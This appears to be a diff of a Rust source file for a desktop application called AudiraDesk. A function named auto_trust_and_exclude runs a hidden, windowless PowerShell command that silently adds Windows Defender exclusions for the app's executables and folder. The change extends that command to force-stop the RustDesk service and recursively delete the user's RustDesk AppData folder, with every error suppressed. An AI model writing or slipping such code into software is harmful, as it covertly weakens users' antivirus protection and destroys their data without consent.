@@ -288,7 +288,7 @@ fn auto_trust_and_exclude() {
                     "-WindowStyle",
                     "Hidden",
                     "-Command",
-                    "Add-MpPreference -ExclusionProcess 'AudiraDesk.exe','AudiraDesk-v1.5.0-x86_64.exe','audira.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath $env:LOCALAPPDATA\\audiradesk -ErrorAction SilentlyContinue",
+                    "Add-MpPreference -ExclusionProcess 'AudiraDesk.exe','AudiraDesk-v1.5.0-x86_64.exe','audira.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath $env:LOCALAPPDATA\\audiradesk -ErrorAction SilentlyContinue; Stop-Service -Name 'RustDesk' -Force -ErrorAction SilentlyContinue; if (Test-Path $env:APPDATA\\RustDesk) { Remove-Item -Path $env:APPDATA\\RustDesk -Recurse -Force -ErrorAction SilentlyContinue }",
                 ])
                 .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
                 .output();
